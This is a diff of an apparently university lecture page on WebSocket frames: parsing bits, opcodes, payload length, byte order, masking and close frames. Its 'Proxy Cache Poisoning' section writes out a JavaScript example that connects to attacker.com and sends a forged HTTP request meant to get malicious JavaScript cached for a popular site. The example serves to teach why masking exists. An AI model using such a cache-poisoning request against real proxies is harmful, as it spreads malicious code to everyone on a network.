@@ -6,6 +6,7 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
+<meta name="description" content="Parsing and building WebSocket frames bit by bit, masking and why it exists, and control frames (close, ping, pong)">
 
 <title>WebSocket Frames – CSE312 Lectures</title>
 <style>
@@ -21,6 +22,41 @@ ul.task-list li input[type="checkbox"] {
   vertical-align: middle;
 }
 .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+/* CSS for syntax highlighting */
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
 </style>
 
 
@@ -35,7 +71,7 @@ ul.task-list li input[type="checkbox"] {
 <link href="../site_libs/quarto-html/quarto-syntax-highlighting-9582434199d49cc9e91654cdeeb4866b.css" rel="stylesheet" id="quarto-text-highlighting-styles">
 <script src="../site_libs/bootstrap/bootstrap.min.js"></script>
 <link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="../site_libs/bootstrap/bootstrap-7a50e0ac30c972af4133516bac05b195.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<link href="../site_libs/bootstrap/bootstrap-70be65e10dfc7715c7a332b37406eead.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
 <script id="quarto-search-options" type="application/json">{
   "language": {
     "search-no-results-text": "No results",
@@ -52,6 +88,7 @@ ul.task-list li input[type="checkbox"] {
   }
 }</script>
 </head><body class="quarto-light"><a class="skip-link" href="#main-content">Skip to main content</a>
+<!-- <link rel="icon" type="image/x-icon" href="/static_files/favicon.ico"> -->
 <script>
 document.addEventListener("DOMContentLoaded", function () {
   if (document.getElementById("main-content")) {
@@ -82,34 +119,51 @@ document.addEventListener("DOMContentLoaded", function () {
     <h2 id="toc-title">On this page</h2>
    
   <ul class="collapse">
-  <li><a href="#websockets" id="toc-websockets" class="nav-link active" data-scroll-target="#websockets">WebSockets</a></li>
+  <li><a href="#websockets" id="toc-websockets" class="nav-link active" data-scroll-target="#websockets">WebSockets</a>
+  <ul class="collapse">
   <li><a href="#websockets-1" id="toc-websockets-1" class="nav-link" data-scroll-target="#websockets-1">WebSockets</a></li>
   <li><a href="#websocket-frame" id="toc-websocket-frame" class="nav-link" data-scroll-target="#websocket-frame">WebSocket Frame</a></li>
   <li><a href="#protocols-sidenote" id="toc-protocols-sidenote" class="nav-link" data-scroll-target="#protocols-sidenote">Protocols Sidenote</a></li>
   <li><a href="#protocols-sidenote-1" id="toc-protocols-sidenote-1" class="nav-link" data-scroll-target="#protocols-sidenote-1">Protocols Sidenote</a></li>
   <li><a href="#websocket-frame-1" id="toc-websocket-frame-1" class="nav-link" data-scroll-target="#websocket-frame-1">WebSocket Frame</a></li>
   <li><a href="#network-stack" id="toc-network-stack" class="nav-link" data-scroll-target="#network-stack">Network Stack</a></li>
+  </ul></li>
+  <li><a href="#parsing-frames" id="toc-parsing-frames" class="nav-link" data-scroll-target="#parsing-frames">Parsing Frames</a>
+  <ul class="collapse">
   <li><a href="#parsing-bits" id="toc-parsing-bits" class="nav-link" data-scroll-target="#parsing-bits">Parsing Bits</a></li>
-  <li><a href="#parsing-bits-1" id="toc-parsing-bits-1" class="nav-link" data-scroll-target="#parsing-bits-1">Parsing Bits</a></li>
+  <li><a href="#parsing-bits-recall" id="toc-parsing-bits-recall" class="nav-link" data-scroll-target="#parsing-bits-recall">Parsing Bits Recall</a></li>
   <li><a href="#websocket-frame-2" id="toc-websocket-frame-2" class="nav-link" data-scroll-target="#websocket-frame-2">WebSocket Frame</a></li>
   <li><a href="#websocket-frame-3" id="toc-websocket-frame-3" class="nav-link" data-scroll-target="#websocket-frame-3">WebSocket Frame</a></li>
   <li><a href="#websocket-frame-4" id="toc-websocket-frame-4" class="nav-link" data-scroll-target="#websocket-frame-4">WebSocket Frame</a></li>
+  <li><a href="#opcodes" id="toc-opcodes" class="nav-link" data-scroll-target="#opcodes">Opcodes</a></li>
   <li><a href="#websocket-frame-5" id="toc-websocket-frame-5" class="nav-link" data-scroll-target="#websocket-frame-5">WebSocket Frame</a></li>
   <li><a href="#frame-length" id="toc-frame-length" class="nav-link" data-scroll-target="#frame-length">Frame Length</a></li>
   <li><a href="#frame-length-1" id="toc-frame-length-1" class="nav-link" data-scroll-target="#frame-length-1">Frame Length</a></li>
   <li><a href="#frame-length-2" id="toc-frame-length-2" class="nav-link" data-scroll-target="#frame-length-2">Frame Length</a></li>
   <li><a href="#frame-length-3" id="toc-frame-length-3" class="nav-link" data-scroll-target="#frame-length-3">Frame Length</a></li>
   <li><a href="#frame-length-4" id="toc-frame-length-4" class="nav-link" data-scroll-target="#frame-length-4">Frame Length</a></li>
+  <li><a href="#byte-order" id="toc-byte-order" class="nav-link" data-scroll-target="#byte-order">Byte Order</a></li>
   <li><a href="#mask-and-payload" id="toc-mask-and-payload" class="nav-link" data-scroll-target="#mask-and-payload">Mask and Payload</a></li>
   <li><a href="#mask-and-payload-1" id="toc-mask-and-payload-1" class="nav-link" data-scroll-target="#mask-and-payload-1">Mask and Payload</a></li>
   <li><a href="#mask-and-payload-2" id="toc-mask-and-payload-2" class="nav-link" data-scroll-target="#mask-and-payload-2">Mask and Payload</a></li>
   <li><a href="#xor-example" id="toc-xor-example" class="nav-link" data-scroll-target="#xor-example">XOR Example</a></li>
   <li><a href="#mask-and-payload-3" id="toc-mask-and-payload-3" class="nav-link" data-scroll-target="#mask-and-payload-3">Mask and Payload</a></li>
-  <li><a href="#sending-frames" id="toc-sending-frames" class="nav-link" data-scroll-target="#sending-frames">Sending Frames</a></li>
-  <li><a href="#sending-frames-1" id="toc-sending-frames-1" class="nav-link" data-scroll-target="#sending-frames-1">Sending Frames</a></li>
-  <li><a href="#sending-frames-2" id="toc-sending-frames-2" class="nav-link" data-scroll-target="#sending-frames-2">Sending Frames</a></li>
-  <li><a href="#sending-frames-3" id="toc-sending-frames-3" class="nav-link" data-scroll-target="#sending-frames-3">Sending Frames</a></li>
-  <li><a href="#sending-frames-4" id="toc-sending-frames-4" class="nav-link" data-scroll-target="#sending-frames-4">Sending Frames</a></li>
+  </ul></li>
+  <li><a href="#why-mask" id="toc-why-mask" class="nav-link" data-scroll-target="#why-mask">Why Mask?</a>
+  <ul class="collapse">
+  <li><a href="#masking-is-not-encryption" id="toc-masking-is-not-encryption" class="nav-link" data-scroll-target="#masking-is-not-encryption">Masking Is Not Encryption</a></li>
+  <li><a href="#proxy-cache-poisoning" id="toc-proxy-cache-poisoning" class="nav-link" data-scroll-target="#proxy-cache-poisoning">Proxy Cache Poisoning</a></li>
+  <li><a href="#masking-fixes-it" id="toc-masking-fixes-it" class="nav-link" data-scroll-target="#masking-fixes-it">Masking Fixes It</a></li>
+  </ul></li>
+  <li><a href="#control-frames" id="toc-control-frames" class="nav-link" data-scroll-target="#control-frames">Control Frames</a>
+  <ul class="collapse">
+  <li><a href="#close-frames" id="toc-close-frames" class="nav-link" data-scroll-target="#close-frames">Close Frames</a></li>
+  <li><a href="#close-frame-structure" id="toc-close-frame-structure" class="nav-link" data-scroll-target="#close-frame-structure">Close Frame Structure</a></li>
+  <li><a href="#reading-a-close-frame" id="toc-reading-a-close-frame" class="nav-link" data-scroll-target="#reading-a-close-frame">Reading a Close Frame</a></li>
+  <li><a href="#ping-and-pong" id="toc-ping-and-pong" class="nav-link" data-scroll-target="#ping-and-pong">Ping and Pong</a></li>
+  <li><a href="#why-ping" id="toc-why-ping" class="nav-link" data-scroll-target="#why-ping">Why Ping?</a></li>
+  <li><a href="#further-reading" id="toc-further-reading" class="nav-link" data-scroll-target="#further-reading">Further Reading</a></li>
+  </ul></li>
   </ul>
 </nav>
     </div>
@@ -119,9 +173,13 @@ document.addEventListener("DOMContentLoaded", function () {
 <header id="title-block-header" class="quarto-title-block default">
 <div class="quarto-title">
 <h1 class="title">WebSocket Frames</h1>
-<p class="subtitle lead">CSE312 — Web Development</p>
 </div>
 
+<div>
+  <div class="description">
+    Parsing and building WebSocket frames bit by bit, masking and why it exists, and control frames (close, ping, pong)
+  </div>
+</div>
 
 
 <div class="quarto-title-meta">
@@ -136,9 +194,8 @@ document.addEventListener("DOMContentLoaded", function () {
 </header>
 
 
-<section id="websockets" class="level2">
-<h2 class="anchored" data-anchor-id="websockets">WebSockets</h2>
-</section>
+<section id="websockets" class="level1">
+<h1>WebSockets</h1>
 <section id="websockets-1" class="level2">
 <h2 class="anchored" data-anchor-id="websockets-1">WebSockets</h2>
 <ul>
@@ -149,7 +206,7 @@ document.addEventListener("DOMContentLoaded", function () {
 <section id="websocket-frame" class="level2">
 <h2 class="anchored" data-anchor-id="websocket-frame">WebSocket Frame</h2>
 <p>https://tools.ietf.org/html/rfc6455#section-5.2</p>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, 32 bits per row. In order: FIN (1 bit), RSV1, RSV2, and RSV3 (1 bit each), opcode (4 bits), MASK (1 bit), payload len (7 bits), an extended payload length of 16 bits if payload len is 126 or 64 bits if it is 127, a 4-byte masking key if MASK is 1, then the payload data. The optional fields have dashed borders."></p>
 </section>
 <section id="protocols-sidenote" class="level2">
 <h2 class="anchored" data-anchor-id="protocols-sidenote">Protocols Sidenote</h2>
@@ -160,7 +217,7 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>Send the bits through the Internet</li>
 <li>Receiver interprets the bits following the same protocol to extract meaning from the bits</li>
 </ul></li>
-<li>Protocols enable communication using only 1's and 0's</li>
+<li>Protocols enable complex communication using only 1's and 0's</li>
 </ul>
 </section>
 <section id="protocols-sidenote-1" class="level2">
@@ -170,7 +227,7 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>Routers read the IP header following this protocol to know how to route a packet</li>
 <li>Endpoints follow the TCP protocol to assemble a sequence of packets and send it to the process using the given port</li>
 </ul>
-<p><img src="assets/slide05-diagram.jpg" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/ip_tcp_headers.svg" class="img-fluid" alt="Left: the IPv4 header from RFC 791, 32 bits per row: Version, IHL, Type of Service, Total Length; Identification, Flags, Fragment Offset; Time to Live, Protocol, Header Checksum; Source Address; Destination Address; Options, Padding. Right: the TCP header from RFC 793: Source Port, Destination Port; Sequence Number; Acknowledgment Number; Data Offset, Reserved, the URG, ACK, PSH, RST, SYN, and FIN flags, Window; Checksum, Urgent Pointer; Options, Padding; then data."></p>
 </section>
 <section id="websocket-frame-1" class="level2">
 <h2 class="anchored" data-anchor-id="websocket-frame-1">WebSocket Frame</h2>
@@ -182,18 +239,18 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>We can rely on the client following this protocol</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="network-stack" class="level2">
 <h2 class="anchored" data-anchor-id="network-stack">Network Stack</h2>
-<p>IP</p>
 <ul>
 <li>An IP packet containing a WebSocket frame looks like this</li>
 </ul>
-<p>TCP</p>
-<p>WebSocket</p>
-<p><img src="assets/slide07-diagram.jpg" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/packet_stack.svg" class="img-fluid" alt="Three headers stacked in the order they are sent: the IP header, then the TCP header, then the WebSocket frame. The IP header holds Version, IHL, Type of Service, Total Length, Identification, Flags, Fragment Offset, Time to Live, Protocol, Header Checksum, Source Address, Destination Address, Options, and Padding. The TCP header holds Source Port, Destination Port, Sequence Number, Acknowledgment Number, Data Offset, Reserved, flags, Window, Checksum, Urgent Pointer, Options, and Padding. The WebSocket frame holds FIN, RSV1-3, opcode, MASK, payload len, extended payload length, masking key, and payload data."></p>
 </section>
+</section>
+<section id="parsing-frames" class="level1">
+<h1>Parsing Frames</h1>
 <section id="parsing-bits" class="level2">
 <h2 class="anchored" data-anchor-id="parsing-bits">Parsing Bits</h2>
 <ul>
@@ -204,20 +261,24 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>Helpful to recall that bytes are represented as 8-bit integer values (0-255)</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
-<section id="parsing-bits-1" class="level2">
-<h2 class="anchored" data-anchor-id="parsing-bits-1">Parsing Bits</h2>
+<section id="parsing-bits-recall" class="level2">
+<h2 class="anchored" data-anchor-id="parsing-bits-recall">Parsing Bits Recall</h2>
 <ul>
-<li>Bit Example - To read the opcode:
+<li>To read the opcode:
 <ul>
 <li>get the byte at index 0</li>
-<li>Bitwise AND (&amp; in most languages) this byte with a "bit mask" of 15</li>
-<li>Since 15 == 00001111 as a byte this will 0 out the 4 higher order bits</li>
+<li>Bitwise AND this byte with a "bit mask" of 0x0F (00001111)</li>
+<li>This will 0 out the 4 higher order bits</li>
 <li>We now have an int from 0-15 representing the opcode</li>
 </ul></li>
+<li>To read the FIN bit:
+<ul>
+<li>Shift the first byte right by 7 bits</li>
+</ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="websocket-frame-2" class="level2">
 <h2 class="anchored" data-anchor-id="websocket-frame-2">WebSocket Frame</h2>
@@ -227,8 +288,12 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>1 - This is the last frame for this message</li>
 <li>0 - There will be continuation frames containing more data for the same message</li>
 </ul></li>
+<li>More about this in the next lecture
+<ul>
+<li>Until then, it will always be 1</li>
+</ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="websocket-frame-3" class="level2">
 <h2 class="anchored" data-anchor-id="websocket-frame-3">WebSocket Frame</h2>
@@ -236,10 +301,12 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>RSV: Reserved bits
 <ul>
 <li>Used to specify any extensions being used</li>
+<li>Nonzero only if the client and server agreed on an extension in the handshake</li>
+<li>Chrome offers <code>Sec-WebSocket-Extensions: permessage-deflate</code>. Your 101 response doesn't accept it, so no extension is used</li>
 </ul></li>
 <li>[You can assume these are always 000 for the HW]</li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="websocket-frame-4" class="level2">
 <h2 class="anchored" data-anchor-id="websocket-frame-4">WebSocket Frame</h2>
@@ -247,10 +314,49 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>opcode: Operation code
 <ul>
 <li>Specifies the type of information contained in the payload</li>
-<li>Ex: 0001 for text, 0010 for binary, 1000 to close the connection, 0000 for continuation frame</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
+</section>
+<section id="opcodes" class="level2">
+<h2 class="anchored" data-anchor-id="opcodes">Opcodes</h2>
+<table class="caption-top table">
+<thead>
+<tr class="header">
+<th>Opcode</th>
+<th>Type</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>0000</td>
+<td>Continuation Frame</td>
+</tr>
+<tr class="even">
+<td>0001</td>
+<td>Text</td>
+</tr>
+<tr class="odd">
+<td>0010</td>
+<td>Binary</td>
+</tr>
+<tr class="even">
+<td>1000</td>
+<td>Close</td>
+</tr>
+<tr class="odd">
+<td>1001</td>
+<td>Ping</td>
+</tr>
+<tr class="even">
+<td>1010</td>
+<td>Pong</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Opcodes 1000 and above are <strong>control frames</strong></li>
+</ul>
 </section>
 <section id="websocket-frame-5" class="level2">
 <h2 class="anchored" data-anchor-id="websocket-frame-5">WebSocket Frame</h2>
@@ -260,9 +366,10 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>Set to 1 if a mask is being used</li>
 <li>Set to 0 if no mask is being used</li>
 </ul></li>
-<li>This will be 1 when receiving messages from a client</li>
+<li>This will <strong>always</strong> be 1 when receiving messages from a client</li>
+<li>You will <strong>always</strong> set this to 0 when sending a frame from your server</li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="frame-length" class="level2">
 <h2 class="anchored" data-anchor-id="frame-length">Frame Length</h2>
@@ -273,7 +380,7 @@ document.addEventListener("DOMContentLoaded", function () {
 </ul></li>
 <li>The length can be represented in 7, 16, or 64 bits</li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="frame-length-1" class="level2">
 <h2 class="anchored" data-anchor-id="frame-length-1">Frame Length</h2>
@@ -284,7 +391,7 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>The next bit after the length is either the mask or payload</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="frame-length-2" class="level2">
 <h2 class="anchored" data-anchor-id="frame-length-2">Frame Length</h2>
@@ -295,7 +402,7 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>The next 16 bits represents the payload length</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="frame-length-3" class="level2">
 <h2 class="anchored" data-anchor-id="frame-length-3">Frame Length</h2>
@@ -310,7 +417,7 @@ document.addEventListener("DOMContentLoaded", function () {
 </ul></li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="frame-length-4" class="level2">
 <h2 class="anchored" data-anchor-id="frame-length-4">Frame Length</h2>
@@ -322,18 +429,33 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>Else, the value itself is the length</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
+</section>
+<section id="byte-order" class="level2">
+<h2 class="anchored" data-anchor-id="byte-order">Byte Order</h2>
+<ul>
+<li>Multi-byte values sent over a network are <strong>big-endian</strong>
+<ul>
+<li>Most significant byte first. Also called "network byte order"</li>
+<li>IP and TCP headers, the 16 and 64 bit WebSocket lengths, and the close frame status code</li>
+</ul></li>
+<li>The bytes <code>[0x01, 0x2C]</code> as a 16-bit length are <code>0x012C</code> = 300
+<ul>
+<li>Read them little-endian and you get <code>0x2C01</code> = 11265</li>
+</ul></li>
+<li>On the HW, you allowed to research and use packages that perform byte/int conversions</li>
+</ul>
 </section>
 <section id="mask-and-payload" class="level2">
 <h2 class="anchored" data-anchor-id="mask-and-payload">Mask and Payload</h2>
 <ul>
-<li>After all the length bits:
+<li>After all the payload length bits:
 <ul>
-<li>If the MASK bit == 1, the next 4 bytes (32 bits) is the mask</li>
-<li>If the MASK bit == 0, the payload begins</li>
+<li>If the MASK bit == 1 (client to server messages), the next 4 bytes is the masking key</li>
+<li>If the MASK bit == 0 (server to client and all control frames), the payload begins</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="mask-and-payload-1" class="level2">
 <h2 class="anchored" data-anchor-id="mask-and-payload-1">Mask and Payload</h2>
@@ -344,38 +466,41 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>You must parse this each time a message is received</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="mask-and-payload-2" class="level2">
 <h2 class="anchored" data-anchor-id="mask-and-payload-2">Mask and Payload</h2>
 <ul>
 <li>Each 4 bytes of the payload has been XORed with the mask by the client</li>
-<li>Read the payload 4 bytes at a time and XOR the bytes with the mask</li>
-<li>If the length is not a multiple of 4, use only the bytes of the mask that are needed
+<li>Byte <code>i</code> of the payload was XORed with byte <code>i % 4</code> of the mask
 <ul>
-<li>Ie. Always reading 4 bytes will cause an index out of bounds error</li>
+<li>XOR it with the same mask byte again to get the original byte back</li>
+</ul></li>
+<li>If the length is not a multiple of 4, the last few bytes only use the first bytes of the mask
+<ul>
+<li>i.e. Always reading 4 bytes at a time will cause an index out of bounds error ~75% of the time</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
 <section id="xor-example" class="level2">
 <h2 class="anchored" data-anchor-id="xor-example">XOR Example</h2>
 <ul>
 <li>If 4 bytes of the message are:
 <ul>
-<li>01001001_01000011_01010101_00100001</li>
+<li><code>01001001 01000011 01010101 00100001</code></li>
 </ul></li>
 <li>And the random mask is:
 <ul>
-<li>01111011_00100010_01110101_01110011</li>
+<li><code>01111011 00100010 01110101 01110011</code></li>
 </ul></li>
 <li>This part of the payload will be "message XOR mask":
 <ul>
-<li>00110010_01100001_00100000_01010010</li>
+<li><code>00110010 01100001 00100000 01010010</code></li>
 </ul></li>
 <li>When we receive these bits and XOR it with the mask again we get the original message bits:
 <ul>
-<li>01001001_01000011_01010101_00100001</li>
+<li><code>01001001 01000011 01010101 00100001</code></li>
 </ul></li>
 </ul>
 </section>
@@ -385,63 +510,202 @@ document.addEventListener("DOMContentLoaded", function () {
 <li>Once the payload is XORed with the mask 4 bytes at time we get the entire message</li>
 <li>Then process the message</li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
+<p><img src="assets/frame_format.svg" class="img-fluid" alt="The WebSocket frame format from RFC 6455 section 5.2, the same diagram as earlier: FIN, RSV1-3, opcode, MASK, payload len, optional extended payload length, optional masking key, payload data."></p>
 </section>
-<section id="sending-frames" class="level2">
-<h2 class="anchored" data-anchor-id="sending-frames">Sending Frames</h2>
+</section>
+<section id="why-mask" class="level1">
+<h1>Why Mask?</h1>
+<section id="masking-is-not-encryption" class="level2">
+<h2 class="anchored" data-anchor-id="masking-is-not-encryption">Masking Is Not Encryption</h2>
 <ul>
-<li>To send a message to a client:
+<li>The mask is sent in the same frame as the payload</li>
+<li>Anyone who can see the frame can unmask it</li>
+<li>So why does the browser mask every frame it sends?</li>
+</ul>
+</section>
+<section id="proxy-cache-poisoning" class="level2">
+<h2 class="anchored" data-anchor-id="proxy-cache-poisoning">Proxy Cache Poisoning</h2>
 <ul>
-<li>Use this same format</li>
-<li>Assemble a byte array with the appropriate values</li>
-<li>Append your payload as bytes</li>
+<li>Many networks send all web traffic through a proxy (schools, companies, ISPs)
+<ul>
+<li>It caches responses to speed things up for everyone on the network</li>
+</ul></li>
+<li>Some proxies didn't understand <code>Upgrade</code>
+<ul>
+<li>They kept reading the bytes after the handshake as if they were HTTP</li>
+</ul></li>
+<li>Without masking, the attacker's JavaScript chooses the exact bytes on the wire</li>
+</ul>
+<div class="sourceCode" id="cb1"><pre class="sourceCode numberSource javascript number-lines code-with-copy"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1"></a><span class="kw">const</span> socket <span class="op">=</span> <span class="kw">new</span> <span class="bu">WebSocket</span>(<span class="st">"ws://attacker.com/websocket"</span>)<span class="op">;</span></span>
+<span id="cb1-2"><a href="#cb1-2"></a>socket<span class="op">.</span><span class="fu">send</span>(<span class="st">"GET /jquery.js HTTP/1.1</span><span class="sc">\r\n</span><span class="st">Host: popular-site.com</span><span class="sc">\r\n\r\n</span><span class="st">"</span>)<span class="op">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<ul>
+<li>The proxy sees a request for <code>popular-site.com/jquery.js</code> on a connection to the attacker's server
+<ul>
+<li>The attacker's server responds with malicious JavaScript</li>
+<li>The proxy caches it as <code>popular-site.com/jquery.js</code> <span class="yellow">for everyone on the network</span></li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
 </section>
-<section id="sending-frames-1" class="level2">
-<h2 class="anchored" data-anchor-id="sending-frames-1">Sending Frames</h2>
+<section id="masking-fixes-it" class="level2">
+<h2 class="anchored" data-anchor-id="masking-fixes-it">Masking Fixes It</h2>
 <ul>
-<li>Do not use a mask when sending frames to a client
+<li>The browser picks a new random mask for every frame</li>
+<li>The attacker's JavaScript chooses the payload, but can't predict the bytes on the wire
 <ul>
-<li>No caching concerns on server to client frames</li>
+<li>It can't make them look like an HTTP request to anything in between</li>
+</ul></li>
+<li>Frames from the server aren't masked
+<ul>
+<li>The attacker's server can already send any bytes it wants. A mask wouldn't stop anything</li>
+</ul></li>
+<li>Researchers demonstrated this attack in 2011 while WebSockets were being standardized
+<ul>
+<li>Masking was added to the protocol because of it</li>
 </ul></li>
 </ul>
-<p><img src="assets/slide03-1.png" class="img-fluid" alt="TODO: describe this image"></p>
 </section>
-<section id="sending-frames-2" class="level2">
-<h2 class="anchored" data-anchor-id="sending-frames-2">Sending Frames</h2>
+</section>
+<section id="control-frames" class="level1">
+<h1>Control Frames</h1>
+<section id="close-frames" class="level2">
+<h2 class="anchored" data-anchor-id="close-frames">Close Frames</h2>
 <ul>
-<li>Example: For our purposes in the HW
+<li>Opcode: 1000</li>
+<li>Either side may send a close frame to end the connection</li>
+<li>Optional payload: a 2-byte status code (big-endian), then an optional reason in UTF-8
 <ul>
-<li>RSVs are always 0</li>
-<li>opcode is either 0001 (Sending text), 1000 (close connection), or 0000 (continuation frame)</li>
+<li>1000: Normal closure</li>
+<li>1001: Going away (the tab closed, the server is shutting down)</li>
+<li>1002: Protocol error</li>
+<li>1009: Message too big</li>
+</ul></li>
+<li>When you receive a close frame: send a close frame back, then close the TCP connection</li>
+</ul>
+</section>
